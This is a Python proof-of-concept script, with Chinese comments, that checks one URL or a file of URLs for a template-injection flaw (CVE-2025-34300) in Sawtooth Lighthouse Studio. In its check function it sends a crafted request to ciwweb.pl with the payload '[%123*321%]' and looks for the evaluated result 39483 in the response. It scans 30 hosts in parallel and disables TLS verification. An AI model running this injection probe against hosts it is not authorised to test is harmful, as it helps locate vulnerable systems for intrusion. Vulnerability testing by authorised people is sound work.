import argparse
import re
import textwrap
from multiprocessing.dummy import Pool
import requests
import warnings
import urllib3
from urllib3.exceptions import InsecureRequestWarning


# 构建请求头
headers = {
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
    # Content-Type 不需要手动设置，requests 会自动生成正确的 boundary
}


def main():
    # 关闭警告
    urllib3.disable_warnings(InsecureRequestWarning)
    warnings.filterwarnings("ignore")

    banner = r"""
             __   .__             .__ 
            |__|  |__|    ______  |__|
            |  |  |  |   /  ___/  |  |
            |  |  |  |   \___ \   |  |
        /\__|  |  |__|  /____  >  |__|
        \______|             \/       

            """
    print(banner)

    parser = argparse.ArgumentParser(description='Sawtooth Lighthouse Studio存在模板注入漏洞CVE-2025-34300',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent("实例：python3 1.py -u http://www.baidu.com"))
    parser.add_argument("-u", "--url", dest="url", help="请输入待检测的URL")
    parser.add_argument("-f", "--file", dest="file", help="请输入一行一个URL的文件地址")

    args = parser.parse_args()


    urls = []  # 空列表，接收文件中的url

    if args.url:
        check(update(args.url))
    elif args.file:              #批量检测入口
        try:
            with open(args.file, 'r+') as f:
                for i in f:
                    i = i.strip()
                    urls.append(update(i))
            pool = Pool(30)
            pool.map(check, urls)
        except Exception as e:
            print(e)
    else:
        print('请输入参数')


#处理没有协议头的url
def update(domain):
    if 'http' in domain:
        return domain
    else:
        return f'http://{domain}'

#用于检测漏洞
def check(domain):
    url = f'{domain}/cgi-bin/ciwweb.pl?hid_javascript=1&hid_Random_ACARAT=[%25123*321%25]&hid_Random_ACARAT=x'
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=5)
        if '39483' in response.text and response.status_code == 200:
            print(f'[+] {domain} 存在漏洞')
        else:
            print(f'[-] {domain} 不存在漏洞')
    except Exception as e:
        print(f'[!] {domain} 检测出现错误')



if __name__ == '__main__':
    main()